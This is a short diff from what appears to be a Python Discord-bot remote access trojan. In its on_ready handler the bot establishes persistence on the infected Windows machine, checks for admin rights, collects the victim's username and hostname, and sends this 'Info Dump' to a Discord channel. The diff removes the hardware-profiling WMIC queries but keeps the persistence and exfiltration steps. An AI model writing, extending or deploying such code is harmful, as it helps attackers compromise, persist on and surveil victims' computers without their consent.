@@ -70,16 +70,11 @@ async def on_ready():
                 info_buffer = ''
                 
                 is_persistant = addPersistence()
-                    
                 is_admin = isAdmin()                
-                computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
-                cpu = subprocess.run(["wmic", "cpu", "get", "Name"],capture_output=True, text=True).stdout.strip().split('\n')[2]
-                gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True,shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
-                ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
                 username = os.getenv("UserName")
                 hostname = os.getenv("COMPUTERNAME")
 
-                info_buffer = "Info Dump\n\nPersistence: {}\nisAdmin: {}\n\nOS: {}\nCPU: {}\nGPU: {}\nRAM: {}\nUsername: {}\nHostname: {}\n\n\n".format(is_persistant, is_admin, computer_os, cpu, gpu, ram, username, hostname, is_admin)
+                info_buffer = "Info Dump\n\nPersistence: {}\nisAdmin: {}\nUsername: {}\nHostname: {}\n\n\n".format(is_persistant, is_admin, username, hostname)
                 
                 await channel.send(info_buffer)                
                 
